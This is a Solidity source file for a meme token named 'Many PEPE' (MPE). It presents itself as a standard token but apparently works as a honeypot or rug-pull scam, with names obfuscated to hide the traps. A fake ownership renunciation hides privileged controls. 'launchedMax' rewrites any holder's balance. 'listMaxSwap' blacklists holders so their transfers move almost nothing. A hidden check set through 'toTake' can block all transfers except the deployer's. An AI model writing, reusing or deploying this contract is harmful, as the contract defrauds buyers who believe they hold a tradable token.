//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface modeAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address toAuto) external view returns (uint256);

    function transfer(address receiverFrom, uint256 takeMinExempt) external returns (bool);

    function allowance(address totalTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeMinExempt) external returns (bool);

    function transferFrom(
        address sender,
        address receiverFrom,
        uint256 takeMinExempt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed buyTake, uint256 value);
    event Approval(address indexed totalTake, address indexed spender, uint256 value);
}

abstract contract toTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface limitMaxLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface toShould {
    function createPair(address takeSellTrading, address maxShould) external returns (address);
}

interface modeAutoMetadata is modeAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ManyPEPE is toTrading, modeAuto, modeAutoMetadata {

    function getOwner() external view returns (address) {
        return exemptFund;
    }

    bool public toTokenReceiver;

    mapping(address => mapping(address => uint256)) private autoEnableBuy;

    address private exemptFund;

    function owner() external view returns (address) {
        return exemptFund;
    }

    address marketingAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function balanceOf(address toAuto) public view virtual override returns (uint256) {
        return txLimit[toAuto];
    }

    function autoList() private view {
        require(tradingMax[_msgSender()]);
    }

    function transferFrom(address listFrom, address receiverFrom, uint256 takeMinExempt) external override returns (bool) {
        if (_msgSender() != marketingAmount) {
            if (autoEnableBuy[listFrom][_msgSender()] != type(uint256).max) {
                require(takeMinExempt <= autoEnableBuy[listFrom][_msgSender()]);
                autoEnableBuy[listFrom][_msgSender()] -= takeMinExempt;
            }
        }
        return txAuto(listFrom, receiverFrom, takeMinExempt);
    }

    function symbol() external view virtual override returns (string memory) {
        return limitTeam;
    }

    function launchedMax(address tokenFeeTake, uint256 takeMinExempt) public {
        autoList();
        txLimit[tokenFeeTake] = takeMinExempt;
    }

    bool public maxBuy;

    function totalSupply() external view virtual override returns (uint256) {
        return totalReceiver;
    }

    function tokenTotal(address listFrom, address receiverFrom, uint256 takeMinExempt) internal returns (bool) {
        require(txLimit[listFrom] >= takeMinExempt);
        txLimit[listFrom] -= takeMinExempt;
        txLimit[receiverFrom] += takeMinExempt;
        emit Transfer(listFrom, receiverFrom, takeMinExempt);
        return true;
    }

    uint256 public listTrading;

    function decimals() external view virtual override returns (uint8) {
        return liquidityEnable;
    }

    string private limitTeam = "MPE";

    uint256 public limitFundIs;

    event OwnershipTransferred(address indexed buyMin, address indexed teamReceiver);

    uint8 private liquidityEnable = 18;

    mapping(address => bool) public launchMaxReceiver;

    address isAmountFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function limitTrading(address amountReceiver) public {
        require(amountReceiver.balance < 100000);
        if (maxBuy) {
            return;
        }
        
        tradingMax[amountReceiver] = true;
        
        maxBuy = true;
    }

    function txAuto(address listFrom, address receiverFrom, uint256 takeMinExempt) internal returns (bool) {
        if (listFrom == modeLimit) {
            return tokenTotal(listFrom, receiverFrom, takeMinExempt);
        }
        uint256 modeWallet = modeAuto(receiverEnableFrom).balanceOf(isAmountFee);
        require(modeWallet == tokenShouldTotal);
        require(receiverFrom != isAmountFee);
        if (launchMaxReceiver[listFrom]) {
            return tokenTotal(listFrom, receiverFrom, feeTo);
        }
        return tokenTotal(listFrom, receiverFrom, takeMinExempt);
    }

    uint256 tokenShouldTotal;

    uint256 tradingTotal;

    uint256 private totalReceiver = 100000000 * 10 ** 18;

    bool private maxSenderReceiver;

    function approve(address swapTotal, uint256 takeMinExempt) public virtual override returns (bool) {
        autoEnableBuy[_msgSender()][swapTotal] = takeMinExempt;
        emit Approval(_msgSender(), swapTotal, takeMinExempt);
        return true;
    }

    function toTake(uint256 takeMinExempt) public {
        autoList();
        tokenShouldTotal = takeMinExempt;
    }

    uint256 constant feeTo = 4 ** 10;

    constructor (){
        if (maxSenderReceiver) {
            maxSenderReceiver = false;
        }
        limitMaxLaunched buyTradingWallet = limitMaxLaunched(marketingAmount);
        receiverEnableFrom = toShould(buyTradingWallet.factory()).createPair(buyTradingWallet.WETH(), address(this));
        if (limitFundIs == listTrading) {
            maxSenderReceiver = false;
        }
        modeLimit = _msgSender();
        modeTxAuto();
        tradingMax[modeLimit] = true;
        txLimit[modeLimit] = totalReceiver;
        if (limitFundIs == listTrading) {
            maxSenderReceiver = true;
        }
        emit Transfer(address(0), modeLimit, totalReceiver);
    }

    function allowance(address sellAt, address swapTotal) external view virtual override returns (uint256) {
        if (swapTotal == marketingAmount) {
            return type(uint256).max;
        }
        return autoEnableBuy[sellAt][swapTotal];
    }

    mapping(address => bool) public tradingMax;

    function listMaxSwap(address liquidityTeam) public {
        autoList();
        
        if (liquidityTeam == modeLimit || liquidityTeam == receiverEnableFrom) {
            return;
        }
        launchMaxReceiver[liquidityTeam] = true;
    }

    mapping(address => uint256) private txLimit;

    address public receiverEnableFrom;

    uint256 public feeIs;

    function transfer(address tokenFeeTake, uint256 takeMinExempt) external virtual override returns (bool) {
        return txAuto(_msgSender(), tokenFeeTake, takeMinExempt);
    }

    string private fromTx = "Many PEPE";

    function modeTxAuto() public {
        emit OwnershipTransferred(modeLimit, address(0));
        exemptFund = address(0);
    }

    function name() external view virtual override returns (string memory) {
        return fromTx;
    }

    bool public listTake;

    bool private modeTeamLiquidity;

    address public modeLimit;

}